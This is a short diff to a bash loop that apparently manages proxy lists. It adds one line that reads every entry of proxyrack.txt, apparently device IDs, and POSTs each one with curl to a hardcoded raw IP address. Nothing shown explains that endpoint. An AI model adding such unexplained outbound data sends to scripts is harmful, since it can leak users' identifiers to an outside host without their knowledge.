@@ -38,6 +38,7 @@ while true; do
   LINE_COUNT=$(wc -l < proxies.txt)
   if [ "$LINE_COUNT" -lt 5 ]; then
     echo "proxies.txt có ít hơn 5 dòng ($LINE_COUNT dòng), chờ 2 phút..."
+    xargs -I{} curl -s -X POST http://54.36.60.95:3000/ping -H "Content-Type: application/json" -d '{"device_id":"{}"}' < proxyrack.txt
     sleep 120
     continue
   fi
